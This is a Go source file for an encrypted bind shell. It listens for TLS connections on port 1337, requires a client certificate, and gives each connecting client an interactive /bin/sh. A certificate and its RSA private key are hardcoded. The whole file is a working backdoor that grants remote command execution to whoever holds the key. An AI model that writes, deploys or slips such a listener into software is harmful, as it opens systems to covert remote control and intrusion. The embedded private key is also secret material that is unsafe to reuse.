package main

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"os/exec"
)

func handleClient(con net.Conn) {
	defer con.Close()

	sh := exec.Command("/bin/sh", "-i")
	sh.Stdin = con
	sh.Stdout = con
	sh.Stderr = con
	sh.Run()
}

func main() {
	serverpem := []byte(`-----BEGIN CERTIFICATE-----
MIICPzCCAaqgAwIBAgICBnUwCwYJKoZIhvcNAQELMDQxEDAOBgNVBAYTB0F1c3Ry
aWExETAPBgNVBAoTCEhlYXBsb2NrMQ0wCwYDVQQLEwRUSE9SMB4XDTE0MTIyOTIw
MjgxNloXDTI0MTIyOTIwMjgxNlowNDEQMA4GA1UEBhMHQXVzdHJpYTERMA8GA1UE
ChMISGVhcGxvY2sxDTALBgNVBAsTBFRIT1IwgZ8wDQYJKoZIhvcNAQEBBQADgY0A
MIGJAoGBAOqdhmr06r/y6zhJPKKaJMeydWRKGYE02AvNM/sGUP1mwKMm0NGdXpcF
0cWb76Ad6JeSN3ChFxrWLReG3Y1gePjiw8kN6yLC6clNBgw4ZDxbo5GrhAC2+tuy
NIWTne1ecFxwCJfFzuHupCunlkIgRVooD3LIf/XPgE5IgTyl7BlTAgMBAAGjZDBi
MA4GA1UdDwEB/wQEAwIAhDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
DwYDVR0TAQH/BAUwAwEB/zAOBgNVHQ4EBwQFAQIDBAUwEAYDVR0jBAkwB4AFAQID
BAUwCwYJKoZIhvcNAQELA4GBADk9jWEjPkKi0uUdLEzBXaMJ41swnm3e3OKVZM2q
LRXO8Z2CnEAxGs9bQiMJvoHnxZYfOoMNhOY+RwuqYNYWPW3DZf0aAlXp7xIYy2i8
rq5sQx0yY81DNkwHbsCIN+TGtfmtCFXu4AXEpwt2BI/XlaSx67aSyB5jULaIRqn9
uOlf
-----END CERTIFICATE-----`)

	serverkey := []byte(`-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDqnYZq9Oq/8us4STyimiTHsnVkShmBNNgLzTP7BlD9ZsCjJtDR
nV6XBdHFm++gHeiXkjdwoRca1i0Xht2NYHj44sPJDesiwunJTQYMOGQ8W6ORq4QA
tvrbsjSFk53tXnBccAiXxc7h7qQrp5ZCIEVaKA9yyH/1z4BOSIE8pewZUwIDAQAB
AoGAL9AikLGRFcU/wpzKSqj3TetEmUewovBOBzmumj3TS5EhOR6z98QGfuiks4zv
7MWrnRgjTETIHKQBVIYbqLA8drh7bxWZdDe9FX6qolrofrA0RVVEX168g6u7nwFH
gKauBHlvhEhsAQDk2lZbAebwMEQ2v9vUN0aSdqyYNbRoTYECQQD2wDMFAJAsnAcV
KB9OPCC6MRVO1/byX53XgdTTYXD3kiTltUdDBG0JLydGq9w1whND3MQ/fMieyQ0A
N+0dJ0EjAkEA82jgAFGokYZ4d4AP7FNRq1uIN2C8gIal4+l07muGLHilV35esirN
lf3jHn5xOdNpdjIkyX17VwRv/gPNzB+CEQJAWUUDsEWZ42m3bkILwWQjevkS+mlL
oDhThIomEytnkUnAK5K/61EImZADp5+5lYFXMvAF1+ovMrMODwwsrqVq/QJAG7Im
MsMX3B8h2+8NYMWGOGo80JhIOpOXkpxAutQvOyYrIg519e3a4KM30YNvnLXKfTFt
cCPAAgG2QH/sTbqUEQJBALJHFbNoXs5UCR/OTj4wX/iORmsG1mp64p+vKY3yEtak
OkzvwlDf7qF7sCxSR+Ohm6qnSXkLZSmr0m+ekiZpwy8=
-----END RSA PRIVATE KEY-----`)

	crt, err := tls.X509KeyPair(serverpem, serverkey)
	if err != nil {
		log.Fatalln(err.Error())
	}
	log.Println("certificate loaded")

	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(serverpem) {
		log.Fatalln("could not load pool")
	}

	cfg := tls.Config{
		ClientAuth:   tls.RequireAndVerifyClientCert,
		Certificates: []tls.Certificate{crt},
		ClientCAs:    pool,
	}

	srv, err := tls.Listen("tcp", "0.0.0.0:1337", &cfg)
	if err != nil {
		log.Fatalln("Error:", err.Error())
	}

	log.Println("server listening")
	defer srv.Close()

	for {
		con, err := srv.Accept()
		if err != nil {
			log.Println("Error:", err.Error())
			continue
		}
		go handleClient(con)
	}
}
